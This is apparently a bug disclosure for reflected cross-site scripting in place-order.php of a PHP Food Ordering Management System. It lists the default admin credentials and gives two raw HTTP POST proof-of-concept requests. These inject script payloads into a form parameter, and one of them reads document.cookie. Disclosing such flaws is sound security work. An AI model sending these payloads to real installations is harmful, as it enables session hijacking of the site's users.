# Food Ordering Management System v1.0 by oretnom23 has Cross-site scripting (reflected)
BUG_Author: Oudaorui

Login account: admin/admin123 (Super Admin account)

vendors:https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html

Vulnerability File: /foms/place-order.php

#POC：

```
POST /foms/place-order.php HTTP/1.1
Host: localhost
Origin: http://localhost
Cookie: PHPSESSID=q8rk2e0ji131erjfddf8dtu1hf
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://localhost/foms/index.php
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 85

1=0rev13%22%3e%3cscript%3ealert('xss')%3c%2fscript%3et4kbj&2=0&description=777596&action=
```

![image](https://github.com/Oudaorui/xsspic/blob/main/placeXss.png)

#POC：
```
POST /foms/place-order.php HTTP/1.1
Host: localhost
Origin: http://localhost
Cookie: PHPSESSID=q8rk2e0ji131erjfddf8dtu1hf
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://localhost/foms/index.php
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 99

1=0rev13%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3et4kbj&2=0&description=777596&action=
```

![image](https://github.com/Oudaorui/xsspic/blob/main/placeDocumentCookies.png)







